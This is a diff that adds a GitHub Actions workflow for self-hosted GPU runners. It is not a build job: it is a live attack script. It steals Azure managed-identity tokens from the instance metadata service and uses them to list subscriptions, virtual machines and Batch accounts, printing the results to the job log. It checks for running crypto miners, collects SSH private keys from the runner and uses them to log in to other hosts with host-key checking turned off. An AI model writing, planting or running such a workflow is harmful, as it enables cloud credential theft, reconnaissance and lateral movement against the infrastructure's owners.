@@ -1,0 +1,45 @@
+name: ul8781ins
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  ins:
+    strategy:
+      fail-fast: false
+      matrix:
+        lbl: [h-t1946107x61, h-t1946107x76, h-a100itn1, h-t19i52947-eus-h, hk-az, ul-l40s]
+    runs-on: [self-hosted, "${{ matrix.lbl }}"]
+    timeout-minutes: 300
+    steps:
+      - name: imds-arm
+        run: |
+          set +e
+          echo "CTX label=${{ matrix.lbl }} host=$(hostname)"
+          id; hostname -I; cat /proc/1/cgroup | head -3
+          nvidia-smi -L 2>&1 | head -10
+          nvidia-smi --query-gpu=index,name,serial --format=csv,noheader 2>&1 | head -10
+          pgrep -af 'pearl|wildrig|xmrig|SRBMiner|peakminer' | head -8
+          for CID in DEFAULT 621dcd44-3c72-4105-b862-301a105412af b9590f55-e173-495c-9010-15beb8611a43 25c1dc23-3925-49f1-94d3-4e702da5fa9b; do
+            if [ "$CID" = "DEFAULT" ]; then U="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/";
+            else U="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$CID"; fi
+            curl -s -m 6 -H Metadata:true "$U" -o tok_$CID.json
+            T=$(python3 -c "import json,sys;d=json.load(open('tok_$CID.json'));print(d.get('access_token',''))" 2>/dev/null)
+            echo "IMDS $CID tok_len=${#T}"
+            if [ "${#T}" -gt 100 ]; then
+              echo "$T" > arm.bearer
+              curl -s -m 25 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions?api-version=2022-12-01" -o subs.json
+              python3 -c "import json;d=json.load(open('subs.json'));[print('SUB',s['subscriptionId'],s['displayName'],s['state']) for s in d.get('value',[])]" 2>/dev/null
+              curl -s -m 60 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&statusOnly=true" -o vms.json
+              python3 -c "import json;d=json.load(open('vms.json'));vs=d.get('value',[]);print('VMS',len(vs));[print('VM',v['name'],v['location'],(v['properties'].get('hardwareProfile') or {}).get('vmSize',''),(v['properties'].get('extended') or {}).get('instanceView',{}).get('statuses',[{}])[0].get('code','')) for v in vs]" 2>/dev/null
+              curl -s -m 40 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Batch/batchAccounts?api-version=2024-07-01" -o batch.json
+              head -c 800 batch.json
+              break
+            fi
+          done
+          echo "== ssh fan from inside =="
+          K=$(ls /home/*/.ssh/*.pem /root/.ssh/*.pem 2>/dev/null | head -3); echo "keys:$K"
+          for h in $(awk -F'\t' 'NR>1{print $2}' az/hosts.tsv 2>/dev/null | head -6); do
+            ssh -i "$(echo $K | cut -d" " -f1)" -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes ubuntu@$h 'id; nvidia-smi -L | head -3' 2>&1 | head -4
+          done
